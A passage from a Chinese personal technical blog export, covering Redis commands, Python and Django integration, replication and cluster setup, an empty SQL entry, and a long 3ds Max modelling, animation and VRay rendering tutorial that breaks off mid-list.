<h3 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h3><p>基本操作</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 键命令</span></span><br><span class="line">keys pattern  <span class="comment"># 支持正则表达式</span></span><br><span class="line">keys *  <span class="comment"># 查看所有键</span></span><br><span class="line">keys <span class="string">&#x27;a*&#x27;</span>  <span class="comment"># 查看所有a开头的键</span></span><br><span class="line">exists key  <span class="comment"># 查看是否存在键</span></span><br><span class="line"><span class="built_in">type</span> key  <span class="comment"># 查看类型</span></span><br><span class="line">del key  <span class="comment"># 删除键</span></span><br><span class="line">expire key seconds  <span class="comment"># 设置过期时间</span></span><br><span class="line">ttl key  <span class="comment"># 查看键的剩余时间</span></span><br></pre></td></tr></table></figure>

<p>字符串操作</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 保存</span></span><br><span class="line"><span class="built_in">set</span> key value</span><br><span class="line">setex key seconds value  <span class="comment"># 设置过期时间</span></span><br><span class="line">mset key1 value1 key2 value2  <span class="comment"># 设置多个键值</span></span><br><span class="line">append key value  <span class="comment"># 追加值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取</span></span><br><span class="line">get key  <span class="comment"># 如果不存在返回(nil)</span></span><br><span class="line">mget key1 key2 key3</span><br></pre></td></tr></table></figure>

<p>哈希操作</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置</span></span><br><span class="line">hset key field value  <span class="comment"># 设置单个属性</span></span><br><span class="line">hmset key field1 value1 field2 value2  <span class="comment"># 设置多个值</span></span><br><span class="line"><span class="comment"># 获取</span></span><br><span class="line">hkeys key  <span class="comment"># 获取属性</span></span><br><span class="line">hget key field  <span class="comment"># 获取值</span></span><br><span class="line">hmget key field1 field2  <span class="comment"># 获取多个值</span></span><br><span class="line">hvals key  <span class="comment"># 获取所有值</span></span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line">hdel key field1 field2  <span class="comment"># 删除属性</span></span><br></pre></td></tr></table></figure>
<p>执行hset可能会抛出无法保存快照的错误，可以执行如下命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">config <span class="built_in">set</span> stop-writes-on-bgsave-error no</span><br></pre></td></tr></table></figure>

<p>列表操作</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 插入</span></span><br><span class="line">lpush key value1 value2  <span class="comment"># 左侧插入</span></span><br><span class="line">rpush key value1 value2  <span class="comment"># 右侧插入</span></span><br><span class="line">linsert key before/after old_key new_key  <span class="comment"># 在old_key前/后插入数据new_key</span></span><br><span class="line"><span class="comment"># 显示</span></span><br><span class="line">lrange key start stop  <span class="comment"># 从几到几，-1表示最后一个</span></span><br><span class="line"><span class="comment"># 修改</span></span><br><span class="line">lset key index value </span><br><span class="line">lrem key count value  <span class="comment"># 删除几个某元素，0表生所有；&gt;0表示从左向右；&lt;0表示从右向左</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>集和操作</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 增加</span></span><br><span class="line">sadd key value1 value2  </span><br><span class="line"><span class="comment"># 获取</span></span><br><span class="line">smmbers key  <span class="comment"># 获取所有元素</span></span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line">srem key value1 value2  <span class="comment"># 删除某些元素</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有序集和</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 增加</span></span><br><span class="line">zadd key score1 member1 score2 member2</span><br><span class="line"><span class="comment"># 获取</span></span><br><span class="line">zrange key start stop </span><br><span class="line">zrangebyscore key min max  <span class="comment"># 查看权重在区间的元素</span></span><br><span class="line">zscore key member  <span class="comment"># 查看权值</span></span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line">zrem key member1 member2</span><br><span class="line">zremrangebyscore key min max  <span class="comment"># 删除权重在区间的元素</span></span><br></pre></td></tr></table></figure>

<h3 id="与-Pyhton-交互"><a href="#与-Pyhton-交互" class="headerlink" title="与 Pyhton 交互"></a>与 Pyhton 交互</h3><p>安装Redis包</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip install redis</span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接数据库，参数：主机名；端口；数据库编号</span></span><br><span class="line">sr = StrictRedis(host=<span class="string">&#x27;localhost&#x27;</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">res = sr.<span class="built_in">set</span>(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;value&#x27;</span>)  <span class="comment"># 返回布尔值，表示是否成功。</span></span><br><span class="line">res = sr.get(<span class="string">&#x27;key&#x27;</span>)  <span class="comment"># 如果有，返回该值；没有，返回None</span></span><br><span class="line">res = sr.delete(<span class="string">&#x27;key&#x27;</span>)  <span class="comment"># 返回删除成功的数量</span></span><br><span class="line">res = sr.keys(pattern=<span class="string">&#x27;*&#x27;</span>)  <span class="comment"># 返回列表</span></span><br></pre></td></tr></table></figure>

<p>配置Django中保存session到Redis</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip install django-redis-sessions</span><br></pre></td></tr></table></figure>

<p>在setting.py中配置Redis</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SESSION_ENGINE = <span class="string">&#x27;redis_sessions.session&#x27;</span></span><br><span class="line">SESSION_REDIS_HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">SESSION_REDIS_PORT  =  <span class="number">6379</span></span><br><span class="line">SESSION_REDIS_DB = <span class="number">2</span></span><br><span class="line">SESSION_REDIS_PASSWORD = <span class="string">&#x27;&#x27;</span> </span><br><span class="line"><span class="comment"># 键前缀</span></span><br><span class="line">SESSION_REDIS_PREFIX = <span class="string">&#x27;session&#x27;</span></span><br></pre></td></tr></table></figure>

<p>使用方法依然不变</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">request.session[<span class="string">&#x27;key&#x27;</span>] = <span class="number">1</span></span><br><span class="line">num = request.session[<span class="string">&#x27;key&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h2 id="Redis-主从"><a href="#Redis-主从" class="headerlink" title="Redis 主从"></a>Redis 主从</h2><p>在Redis中，主从的数据是共享的，也就是实现了数据的冗余保存，这样可以防止一台机器挂掉后数据丢失的问题。一个Redis主机可以有多个从机，一个从机也可以有多个从机。写数据要在主机中，从机可以读取数据。这样也可以实现数据的读写分离。一般情况下，一个网站的数据读写比例为 10:1 ，因此可以配置多个从机用于读取数据。</p>
<p>主机配置可以保存不变，只是IP地址应该使用局域网或公网IP。配置完成运行服务。<br>从机配置，并启动。</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">bind 本机IP</span><br><span class="line">slaveof 主机IP 主机PORT</span><br><span class="line">port 从机PORT，不能与主机冲突</span><br></pre></td></tr></table></figure>

<p>查看某机角色以及状态。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">redis-cli -h 某机IP -p 某机PORT info Replication</span><br></pre></td></tr></table></figure>

<h2 id="Redis-集群"><a href="#Redis-集群" class="headerlink" title="Redis 集群"></a>Redis 集群</h2><p>当用户量达到一定量级时，就需要将Redis服务规模升级为集群。</p>
<h3 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h3><p>首先配置3个配置文件，</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">port 7000</span><br><span class="line">bind 本机IP</span><br><span class="line">daemonize yes</span><br><span class="line">pidfile 7000.pid</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file 7000_node.conf</span><br><span class="line">cluster-node-timeout 15000</span><br><span class="line">appendonly yes</span><br></pre></td></tr></table></figure>

<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">port 7001</span><br><span class="line">bind 本机IP</span><br><span class="line">daemonize yes</span><br><span class="line">pidfile 7001.pid</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file 7001_node.conf</span><br><span class="line">cluster-node-timeout 15000</span><br><span class="line">appendonly yes</span><br></pre></td></tr></table></figure>

<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">port 7002</span><br><span class="line">bind 本机IP</span><br><span class="line">daemonize yes</span><br><span class="line">pidfile 7002.pid</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file 7002_node.conf</span><br><span class="line">cluster-node-timeout 15000</span><br><span class="line">appendonly yes</span><br></pre></td></tr></table></figure>

<p>之后依据这3个配置文件启动3个Redis服务。</p>
<p>使用命令运行集群</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 复制程序</span></span><br><span class="line">sudo <span class="built_in">cp</span> /usr/share/doc/redis-tools/examples/redis-trib.rb /usr/local/bin</span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">sudo gem install redis</span><br><span class="line"><span class="comment"># 安装Ruby，保证是最新版</span></span><br><span class="line">sudo apt-get install ruby</span><br><span class="line"><span class="comment"># 创建集群</span></span><br><span class="line">redis-trib.rb create --replicas 1  IP_1:PORT_1 IP_2:PORT_2 IP_3:PORT_3</span><br></pre></td></tr></table></figure>

<p>创建完成后，会输出几个Redis主机和从机，几个主机分别存储一部分数据，按数据槽存储，槽编号范围是0 ~ 16383。</p>
<h3 id="与Python交互"><a href="#与Python交互" class="headerlink" title="与Python交互"></a>与Python交互</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip install redis-cluster</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rediscluster <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">startup_nodes = [</span><br><span class="line">    &#123;<span class="string">&#x27;host&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;port&#x27;</span>: PORT_1&#125;  <span class="comment"># Redis主机</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">src = StrictRedisCluster(</span><br><span class="line">    startup_nodes=startup_nodes,</span><br><span class="line">    decode_responses=<span class="literal">True</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">result = src.<span class="built_in">set</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;val&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Django</tag>
        <tag>Python</tag>
        <tag>Redis</tag>
        <tag>NoSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL</title>
    <url>/2020/01/14/%E6%95%B0%E6%8D%AE%E5%BA%93/SQL/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>



<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p><a href="https://sqlzoo.net/">SQL练习</a></p>
<h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1>]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>3D 建模与引擎</title>
    <url>/2020/03/14/%E6%B8%B8%E6%88%8F/3dmaxExec/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h2 id="3D-Max-基本操作"><a href="#3D-Max-基本操作" class="headerlink" title="3D Max 基本操作"></a>3D Max 基本操作</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="单位"><a href="#单位" class="headerlink" title="单位"></a>单位</h4><p>自定义 -&gt; 单位设置 -&gt;<br>：显示单位比例 -&gt; 公制 -&gt; 毫米<br>：系统单位设置 -&gt; 系统单位比例 -&gt; 1.0 毫米</p>
<h4 id="首选项"><a href="#首选项" class="headerlink" title="首选项"></a>首选项</h4><p>自定义 -&gt; 首选项 -&gt; 常规 -&gt;<br>：按方向自动切换窗口&#x2F;交叉<br>：场景撤销次数</p>
<p>自定义 -&gt; 首选项 -&gt; 常规 -&gt;<br>：保存时压缩<br>：自动备份 30分钟一次</p>
<p>自定义 -&gt; 首选项 -&gt; 视口 -&gt;<br>：选择&#x2F;预览亮显 预览-轮廓 选择-轮廓</p>
<h3 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h3><p>打开参考图片：<br>文件 -&gt; 查看图像文件</p>
<p>归档，压缩保存所有资源：<br>文件 -&gt; 归档</p>
<p>导入，CAD，模型等：<br>文件 -&gt; 导入 -&gt; 导入<br>文件 -&gt; 导入 -&gt; 合并</p>
<p>不同视图中创建物体，其长宽的方向是不一样的。</p>
<h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><p>F3：线框模式<br>F4：实体模式</p>
<p>F5：X轴约束<br>F6：Y轴约束<br>F7：Z轴约束<br>F8：平面约束</p>
<p>F10：渲染设置</p>
<p>G：隐藏&#x2F;显示栅格<br>Q：框选选择对象<br>H：按名称选择对象</p>
<p>W：移动<br>E：旋转<br>R：缩放<br>S：捕捉<br>A：角度捕捉<br>Space：锁定<br>Shift：加选&#x2F;复制<br>Alt：减选&#x2F;旋转</p>
<p>M：材质编辑器</p>
<p>Shift + Z：恢复视图<br>L：恢复左视图<br>T：恢复顶视图<br>F：恢复前视图<br>C：摄像机视角<br>Alt + X：半透明显示<br>Shift + F：安全框显示</p>
<p>1：切换点层级<br>2：切换线层级<br>3：切换样条线&#x2F;边界层级<br>4：切换面层级<br>5：切换体层级</p>
<p>8：环境</p>
<h2 id="3D-Max-基本操作-1"><a href="#3D-Max-基本操作-1" class="headerlink" title="3D Max 基本操作"></a>3D Max 基本操作</h2><h3 id="菜单栏"><a href="#菜单栏" class="headerlink" title="菜单栏"></a>菜单栏</h3><p>轴点：<br>该物体轴点<br>公共轴点<br>其他物体轴点：在视图中选取轴点</p>
<p>选择并放置：<br>选择一个物体放置到另一个物体上</p>
<p>捕捉工具，右键选择捕捉点：<br>2维捕捉<br>2.5维捕捉：用的最多<br>3维捕捉</p>
<p>捕捉工具，右键：<br>选择捕捉点<br>选项：捕捉到冻结对象 勾选<br>选项：启用轴约束 勾选</p>
<p>角度捕捉工具</p>
<p>轴约束工具：<br>需要在选项中点出来：工具栏-&gt;右键-&gt;轴约束</p>
<p>复制：两个物体无任何关联<br>实例：两个物体有关联，参数改变时一同改变，操作时不会改变<br>参考：父子关系，被复制的是子体。父体被改变，则子体改变，反之不会。</p>
<p>阵列工具：<br>选中一个物体，点击工具 -&gt; 阵列。<br>阵列有移动，旋转，缩放三种阵列方式。</p>
<p>镜像工具：<br>变换：复制或变换。<br>几何体：使用镜像修改器</p>
<p>对齐：<br>对齐，快速对齐，法线对齐，放置高光，摄像机对齐，视图对齐等功能。</p>
<h3 id="命令面板"><a href="#命令面板" class="headerlink" title="命令面板"></a>命令面板</h3><h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><p>包括几何体，图形，灯光，摄像机，辅助对象，空间扭曲，系统。<br>修改项：类型，颜色，名称，参数等。</p>
<p>二维图形：渲染-&gt;在渲染&#x2F;视口中启用，可以产生厚度。</p>
<p>绘制二维图形，可以去掉勾选“开始新图形”，绘制一个复杂二维图形。</p>
<h4 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h4><p>可以添加修改器。<br>可以点击配置修改器集，显示按钮显示修改器。</p>
<h4 id="层次"><a href="#层次" class="headerlink" title="层次"></a>层次</h4><p>包含轴，IK，链接。</p>
<h4 id="运动"><a href="#运动" class="headerlink" title="运动"></a>运动</h4><p>动画时使用。</p>
<h4 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h4><p>隐藏显示对象。</p>
<h4 id="实用程序"><a href="#实用程序" class="headerlink" title="实用程序"></a>实用程序</h4><p>塌陷，灯光检查等。</p>
<h3 id="形状与修改器"><a href="#形状与修改器" class="headerlink" title="形状与修改器"></a>形状与修改器</h3><h4 id="挤出"><a href="#挤出" class="headerlink" title="挤出"></a>挤出</h4><p>对于二维图形可以使用挤出命令，可以变成三维图形。</p>
<h4 id="弯曲"><a href="#弯曲" class="headerlink" title="弯曲"></a>弯曲</h4><p>使3维物体弯曲。</p>
<p>可以通过使用限制，限制弯曲部分。</p>
<h4 id="可编辑样条线"><a href="#可编辑样条线" class="headerlink" title="可编辑样条线"></a>可编辑样条线</h4><p>可编辑样条线，编辑样条线。</p>
<p>点：<br>类型：线性，平滑，贝塞尔，贝塞尔角点<br>断开：点变为两个点<br>优化：在线上加点<br>焊接：两个点变一个点<br>插入：在线上加点，并可移动<br>设为首顶点<br>融合：将线上的点合并<br>循环：切换下一个点<br>圆角：点变圆角<br>切角：点变切角<br>删除：删除点。</p>
<p>线：<br>创建线<br>附加：加入到图像中。<br>优化：在线上加点<br>插入：加点且可以改位置<br>隐藏<br>删除<br>拆分：等分线段<br>分离：离开样条线</p>
<p>样条线：<br>轮廓：向外添加一个轮廓，并给定间距，轮廓方向（内外）和点的方向（逆顺时针）相关。通过反转可以改变方向<br>布尔：布尔操作（在一个样条线内）<br>修建：删除部分样条线，连接处是两个点，需要焊接。<br>炸开：样条线分离成多个样条线</p>
<h4 id="车削"><a href="#车削" class="headerlink" title="车削"></a>车削</h4><p>修改轴，角度，分段数，方向，对齐，输出等。<br>有时需要反转法线。</p>
<h4 id="晶格"><a href="#晶格" class="headerlink" title="晶格"></a>晶格</h4><p>用于制作钢架结构或水晶灯。</p>
<p>几何体：<br>仅来自顶点（支柱）<br>末端封口</p>
<h4 id="布尔工具（复合对象）"><a href="#布尔工具（复合对象）" class="headerlink" title="布尔工具（复合对象）"></a>布尔工具（复合对象）</h4><p>布尔运算：并，交，差，合并，附加，插入</p>
<p>合并：并集和交集共同运算。<br>附加：依然是两个独立物体。<br>插入：差集和B对象。<br>盖印：只是在A上面留下B的轮廓<br>切面：只是在A上面切下B的轮廓</p>
<h4 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h4><p>制作石膏线条，天花板等。<br>根据截面在路径上绘制。</p>
<h4 id="倒角剖面"><a href="#倒角剖面" class="headerlink" title="倒角剖面"></a>倒角剖面</h4><p>经典：<br>可以使用剖面线型。</p>
<p>改进：<br>挤出，倒角宽度，深度等。</p>
<h4 id="放样（复合对象）"><a href="#放样（复合对象）" class="headerlink" title="放样（复合对象）"></a>放样（复合对象）</h4><p>2维图像 + 路径。</p>
<p>在修改器下面，可以看到变形选项（扭曲等）</p>
<h4 id="噪波"><a href="#噪波" class="headerlink" title="噪波"></a>噪波</h4><p>强度，噪点等。</p>
<h4 id="布料-Cloth"><a href="#布料-Cloth" class="headerlink" title="布料 Cloth"></a>布料 Cloth</h4><p>对象属性：<br>改为布料。<br>压力：添加数值，点击模拟（关掉重力）。</p>
<h4 id="FFD"><a href="#FFD" class="headerlink" title="FFD"></a>FFD</h4><p>施加压力</p>
<h4 id="壳命令"><a href="#壳命令" class="headerlink" title="壳命令"></a>壳命令</h4><p>给平面添加厚度，截面可以使用其他图像。</p>
<p>使用3维图形拾取2维图形。</p>
<p>僵角拉直。</p>
<h4 id="散步命令（复合对象）"><a href="#散步命令（复合对象）" class="headerlink" title="散步命令（复合对象）"></a>散步命令（复合对象）</h4><p>使用某个A对象，点击拾取分布B对象，让A在B内散落分布。</p>
<h4 id="图像合并（复合对象）"><a href="#图像合并（复合对象）" class="headerlink" title="图像合并（复合对象）"></a>图像合并（复合对象）</h4><p>可以实现文字投影到球上的效果。</p>
<h4 id="UVW-贴图修改器"><a href="#UVW-贴图修改器" class="headerlink" title="UVW 贴图修改器"></a>UVW 贴图修改器</h4><p>贴图：平面，柱面，球形，长方体等<br>长宽高等。</p>
<h3 id="可编辑多边形"><a href="#可编辑多边形" class="headerlink" title="可编辑多边形"></a>可编辑多边形</h3><p>点：</p>
<ul>
<li>选择：<ul>
<li>忽略背面</li>
<li>收缩，扩大</li>
<li>软选择（山脉，地形）</li>
</ul>
</li>
<li>编辑<ul>
<li>移除：只消除点 </li>
<li>Delete 面也删掉</li>
<li>断开：断开面</li>
<li>挤出，二次挤出</li>
<li>切角：增加点</li>
<li>目标焊接</li>
<li>连接：连接线段</li>
<li>移除孤立点</li>
</ul>
</li>
</ul>
<p>边：</p>
<ul>
<li>选择：<ul>
<li>循环</li>
<li>环形</li>
<li>扩大</li>
<li>收缩</li>
</ul>
</li>
<li>编辑<ul>
<li>分割：分割为两个部分</li>
<li>切角</li>
<li>焊接</li>
<li>桥：填充空洞</li>
<li>连接：增加分段数</li>
</ul>
</li>
<li>编辑几何体<ul>
<li>重复上一个：重复上一次命令</li>
<li>创建直线</li>
<li>塌陷：塌陷为一个点</li>
<li>附加</li>
<li>分离：单独分离</li>
<li>切片平面：切割直线</li>
<li>平面化：将边整齐</li>
</ul>
</li>
</ul>
<p>边界（未封口的地方）：</p>
<ul>
<li>编辑边界<ul>
<li>挤出</li>
<li>插入顶点</li>
<li>切角</li>
<li>封口</li>
<li>桥</li>
</ul>
</li>
</ul>
<p>面：</p>
<ul>
<li>编辑多边形：<ul>
<li>插入顶点</li>
<li>挤出（组，局部法线，按多边形）</li>
<li>轮廓：面缩放</li>
<li>倒角：挤出并放大（组，局部法线，按多边形）</li>
<li>插入：内部插入一个面</li>
<li>翻转：法线反转</li>
<li>桥：拉伸成体</li>
<li>从边旋转：拾取轴</li>
<li>沿样条线挤出</li>
<li>编辑三角剖分（旋转面斜线）</li>
</ul>
</li>
</ul>
<p>元素：</p>
<ul>
<li>细分曲面：圆润<ul>
<li>线的远近影响圆润从成都</li>
</ul>
</li>
<li>绘制变形<ul>
<li>推拉：拉起平面</li>
<li>松弛：推下平面</li>
</ul>
</li>
</ul>
<h3 id="石墨工具"><a href="#石墨工具" class="headerlink" title="石墨工具"></a>石墨工具</h3><p>建模：</p>
<ul>
<li>多边形建模<ul>
<li>预览子对象</li>
<li>转换为可编辑多边形</li>
<li>生成拓扑：线段变为斜线段</li>
</ul>
</li>
<li>修改选择<ul>
<li>循环，环形</li>
<li>点间距</li>
<li>增减循环，环形</li>
<li>扩大，缩小</li>
<li>相似</li>
<li>轮廓</li>
<li>快速循环，环形</li>
</ul>
</li>
<li>编辑<ul>
<li>重复</li>
<li>快速切片</li>
<li>快速循环</li>
<li>绘制连接（Shift 中线）</li>
<li>细分曲面（圆润）</li>
<li>剪切（切割工具）</li>
<li>约束（到边，面，法线）</li>
</ul>
</li>
<li>几何体<ul>
<li>从选项中选择边（四边形化选择）</li>
</ul>
</li>
<li>循环</li>
<li>三角剖分</li>
<li>细分<ul>
<li>网格平滑</li>
<li>细化</li>
</ul>
</li>
<li>可见性<ul>
<li>隐藏选择对象</li>
</ul>
</li>
<li>对齐<ul>
<li>生成平面</li>
</ul>
</li>
<li>属性<br>自由形式：</li>
<li>多边形绘制<ul>
<li>图形：绘制图像</li>
<li>样条线</li>
<li>曲面：绘制面</li>
<li>拓扑：依据线自动产生面</li>
<li>条带：绘制面</li>
<li>分支：绘制凸起</li>
</ul>
</li>
<li>绘制变形：<ul>
<li>偏移</li>
<li>偏移旋转</li>
<li>偏移缩放</li>
<li>噪波</li>
<li>放大<br>选择：</li>
</ul>
</li>
<li>角度：选择某一角度的面</li>
<li>凹面，图面</li>
<li>旋转轴</li>
<li>按边数<br>对象绘制：</li>
<li>绘制对象<ul>
<li>绘制选定对象</li>
<li>绘制列表中的对象<br>填充：</li>
</ul>
</li>
<li>动画中使用</li>
</ul>
<h3 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>右侧：运动编辑<br>菜单栏：图形编辑器 -&gt; 新建轨迹图</p>
<ul>
<li>曲线编辑器</li>
<li>摄影表<ul>
<li>添加关键点</li>
<li>设置过滤器：选定对象切换</li>
<li>设置动画过滤器<ul>
<li>左上角按钮</li>
<li>勾选：控制器类型</li>
</ul>
</li>
<li>编辑 -&gt; 控制器 -&gt; 指定：其他控制器<ul>
<li>Beize控制器：位移动画</li>
<li>位置XYZ控制器</li>
</ul>
</li>
<li>插值：非匀速运动<ul>
<li>自定义插值（最后一个）</li>
<li>进入曲线编辑器：编辑插值曲线</li>
</ul>
</li>
<li>越界：如何循环动画，控制器 -&gt; 超出范围类型<ul>
<li>恒定，周期，循环</li>
<li>往复，线性，相对重复</li>
</ul>
</li>
<li>可见性轨迹：调整可见性<ul>
<li>编辑 -&gt; 可见性轨迹 -&gt; 添加</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>父子关系</p>
<ul>
<li>选择并连接：上方工具栏上，可以跟随动画。</li>
<li>只影响：移动，旋转，缩放</li>
<li>连接性父子关系：子物体牵动父物体</li>
<li>非连接性父子关系：子物体不影响父物体</li>
<li>物体坐标轴：轴 -&gt; 对齐到世界</li>
<li>图解视图：查看物体关系</li>
</ul>
<p>子模式动画：对物体某个点&#x2F;线做动画</p>
<ul>
<li>首先先创建一次自动关键动画</li>
<li>之后在摄影表中出现</li>
</ul>
<p>组：</p>
<ul>
<li>组合：可以批量动画</li>
<li>集合：可以批量动画，调光，过滤色</li>
<li>解组：解散组</li>
<li>打开：临时解开组</li>
<li>附加：将某一个物体加入到组</li>
<li>分离：将物体分出物体</li>
<li>炸开：彻底解开所有组</li>
</ul>
<p>预览选项：工具 -&gt; 预览 -&gt; 抓取视口 -&gt; 生成预览<br>右侧：显示面板 -&gt; 轨迹 -&gt; 勾选：显示运动轨迹</p>
<h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>右下角，时间配置 -&gt;<br>：PAL 制<br>：帧数</p>
<h4 id="制作"><a href="#制作" class="headerlink" title="制作"></a>制作</h4><p>启动：自动关键点（随手关闭）<br>一次只制作一个物体的动画。</p>
<h3 id="VRay-渲染"><a href="#VRay-渲染" class="headerlink" title="VRay 渲染"></a>VRay 渲染</h3><h4 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h4><p>渲染设置：<br>指定渲染器 -&gt; 产品级 -&gt; Vray<br>公用参数</p>
<ul>
<li>时间输出：单帧，范围</li>
<li>渲染区域：视口，选定区域</li>
<li>输出大小</li>
<li>选项：渲染隐藏项，</li>
<li>渲染输出</li>
<li>指定渲染器<br>V-Ray 参数</li>
<li>帧缓冲区：内置缓冲区&#x2F;3DMAX</li>
<li>从Max获取参数</li>
<li>全局开关：灯光，阴影，反射折射，覆盖材质（默认材质）</li>
<li>交互式产品级渲染选项</li>
<li>图像采样器（块，渐进）<ul>
<li>测试：最小细分1，最大细分2，噪波0.1</li>
<li>设计：最小细分2，最大细分4，噪波0.001</li>
</ul>
</li>
<li>图像过滤器</li>
<li>全局蒙特卡洛<ul>
<li>使用局部细分</li>
</ul>
</li>
<li>颜色贴图<ul>
<li>类型：指数（液体），莱茵哈图（饱和度高）</li>
<li>模式：伽马</li>
</ul>
</li>
<li>摄像机：球型，360度（全景）<br>GI</li>
<li>全局照明：灯光效果<ul>
<li>首次引擎：发光贴图</li>
<li>二次引擎：灯光缓存</li>
</ul>
</li>
<li>发光贴图<ul>
<li>预设：非常低（测试）</li>
</ul>
</li>
<li>灯光缓存<ul>
<li>细分：200（测试）1500-2000（实际）<br>设置：</li>
</ul>
</li>
<li>系统：渲染顺序</li>
<li>日志窗口：从不<br>渲染元素：</li>
<li>折射效果</li>
<li>反射效果</li>
<li>法线效果</li>
</ul>
<p>在渲染页面，可以开启交互式渲染（倒数第三个按钮）<br>4.1版本中，可以在视口中交互式渲染</p>
<h3 id="材质"><a href="#材质" class="headerlink" title="材质"></a>材质</h3><p>模式：精简模式与Slate模式</p>
<p>选项 -&gt; 循环：显示更多材质球</p>
<p>实例程序 -&gt; 重置：重置材质球</p>
<p>点击Standard可以切换VRayMtl材质（在渲染设置中开启Vray）。</p>
<p>背景：右边第3个按钮。</p>
<p>下方按钮：指定，删除，吸取，视口中显示明暗处理材质（显示材质），转到父对象。</p>
<p>漫反射：固有颜色和纹理。</p>
<ul>
<li>指定位图：点后面的框，位图<ul>
<li>坐标：U 横向，V 纵向。</li>
<li>偏移</li>
<li>瓷砖：稠密程度</li>
<li>角度：W 角度</li>
<li>模糊：越大越模糊</li>
</ul>
</li>
<li>位图参数</li>
<li>输出：RGB级别</li>
</ul>
<p>反射：</p>
<ul>
<li>反射强度：数值越大越强</li>
<li>反射光泽：模糊程度</li>
<li>菲涅尔反射：关掉则全反射</li>
<li>菲涅尔折射率：反射强度</li>
<li>高光光泽（金属度）：0 非金属，1 金属。</li>
</ul>
<p>双向反射分布函数：调整反射变形（各向异性）</p>
<p>折射：透明程度</p>
<ul>
<li>需要给一定厚度才正确。</li>
<li>光泽度：模糊程度（不要太大）</li>
<li>折射率：变形程度（玻璃，钻石等不同）</li>
<li>影响阴影：控制影子的虚实程度</li>
<li>烟雾颜色：物体颜色</li>
<li>烟雾倍增：颜色深浅</li>
</ul>
<p>修改环境：<br>渲染 -&gt; 环境：背景颜色，贴图</p>
<p>灯光材质 Vray 灯光材质：</p>
<ul>
<li>自发光颜色，<ul>
<li>贴图（需要颜色全黑，添加UVW贴图修改器）</li>
<li>亮度</li>
</ul>
</li>
<li>右键面片，对象属性：<ul>
<li>勾选背面消隐</li>
<li>去掉接收阴影，透射阴影</li>
</ul>
</li>
</ul>
<h3 id="灯光"><a href="#灯光" class="headerlink" title="灯光"></a>灯光</h3><p>VRay 灯光</p>
<ul>
<li>类型：屏幕，球形等<ul>
<li>尺寸</li>
<li>颜色</li>
<li>倍增</li>
</ul>
</li>
